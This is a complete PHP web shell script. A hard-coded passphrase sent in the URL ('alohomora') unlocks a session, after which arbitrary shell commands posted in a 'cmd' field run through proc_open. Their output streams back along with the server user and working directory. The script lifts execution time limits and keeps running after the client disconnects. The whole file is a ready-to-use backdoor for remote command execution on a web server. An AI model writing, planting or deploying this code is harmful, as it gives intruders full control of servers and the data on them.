<?php

//auth pass phrase - edit to change
define('PASS_PHRASE', 'alohomora');

//start session
session_start();

//authenticate session
if (isset($_GET['auth']) && $_GET['auth'] === PASS_PHRASE){
	$_SESSION['pass'] = 1;
	redirect();
}

//logout session
if (isset($_GET['logout'])){
	session_destroy();
	redirect();
}

//auth pass
if (!(isset($_SESSION['pass']) && $_SESSION['pass'] === 1)){
	text_response('Access denied!', 1, 401);
}

//session defaults
$_SESSION['whoami'] = whoami();
if (!isset($_SESSION['cwd'])) set_cwd();

//post request - cwd
if (isset($_POST['cwd'])) set_cwd(trim($_POST['cwd']));

//post request - cmd
if (isset($_POST['cmd'])){
	chdir($_SESSION['cwd']);
	text_response();
	exec_cmd(trim($_POST['cmd']), 1);
	exit();
}

//unsupported request
if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)){
	text_response('Unsupported request!', 1, 403);
}

//path
function path($path){
	return str_replace('\\', '/', $path);
}

//redirect
function redirect($url='./'){
	header("Location: $url");
	exit();
}

//text response
function text_response($text=null, $exit=false, $code=null){
	header('x-cwd: ' . getcwd());
	if (isset($_SESSION['whoami'])) header('x-whoami: ' . $_SESSION['whoami']);
	header('Content-Type: text/plain');
	if ($code) http_response_code($code);
	if ($text) echo $text;
	if ($exit) exit();
}

//whoami
function whoami($exec_cmd=0){
	$whoami = 'undefined';
	if (exec_cmd('whoami', 0, $output, $exit)){
		$output = is_array($output) && count($output) ? trim(implode("\n", $output)) : 'error';
		if ($exit) $output .= "[$exit]";
		$whoami = $output;
	}
	return $whoami;
}

//set cwd
function set_cwd($path=''){
	if ($path === '') $path = getcwd();
	else $path = rtrim($_SESSION['cwd'], '/') . "/$path";
	$path = path(realpath($path));
	if (is_dir($path)){
		$_SESSION['cwd'] = $path;
		chdir($path);
	}
}

//exec cmd
function exec_cmd(string $cmd, bool $print_enabled=false, array &$output=null, int &$result_code=null, int $time_limit=1800){
	$output = [];
	$result_code = 0;

	//ignore empty
	if ($cmd === '') return true;

	//setup
	$limit = is_integer($limit = ini_get('max_execution_time')) ? $limit : 30;
	set_time_limit($time_limit);
	ignore_user_abort(true);
	if ($print_enabled){
		for ($i = ob_get_level(); $i; --$i) ob_end_flush();
		ob_implicit_flush(1);
		flush();
	}

	//helper - output buffer
	$_buffer = function($str) use (&$print_enabled, &$output) {
		$str = sprintf("%s\r\n", preg_replace('/^[\n\r]*|[\n\r]*$/', '', $str));
		if ($print_enabled){
			print($str);
			flush();
		}
		$output[] = $str;
	};

	//helper - escape cmd
	$_escape_cmd = function($cmd){
		$cmd = str_replace(urldecode('%C2%A0'), ' ', $cmd);
		$cmd = escapeshellcmd($cmd);
		$cmd = str_replace('!', '\!', $cmd);
		$cmd = preg_replace('/(?<!^) /', '^ ', $cmd);
		return $cmd;
	};

	//process open
	$process = @proc_open($_escape_cmd($cmd), [
		0 => ['pipe', 'r'], //stdin
		1 => ['pipe', 'w'], //stdout
		2 => ['pipe', 'w'], //stderr
	], $pipes, getcwd());

	//process open failure
	if (!is_resource($process)){
		$_buffer("Failed to open process:  $cmd");
		return false;
	}

	//process close pipe - stdin
	if (is_resource($pipes[0])) fclose($pipes[0]);
	
	//process buffer output
	while(!feof($pipes[1])){
		$str = fgets($pipes[1], 1024);
		if (!strlen($str)) break;
		$str = preg_replace('/^[ ]([^ ])/', '$1', $str);
		$_buffer($str);
		if (connection_aborted()) break;
	}

	//terminate running process
	$status = proc_get_status($process);
	if ($status['running']){
		$pid = $status['pid'];
		exec(sprintf(stripos(php_uname('s'), 'win') > -1 ? 'taskkill /F /T /PID %s' : 'kill -s 9 %s 2>&1', $pid));
		if (is_resource($process)) proc_terminate($process);
	}

	//close process
	@fclose($pipes[1]);
	@fclose($pipes[2]);
	if ($code = @proc_close($process)){
		$_buffer("exit code = $code");
		$result_code = $code;
	}
	return true;
}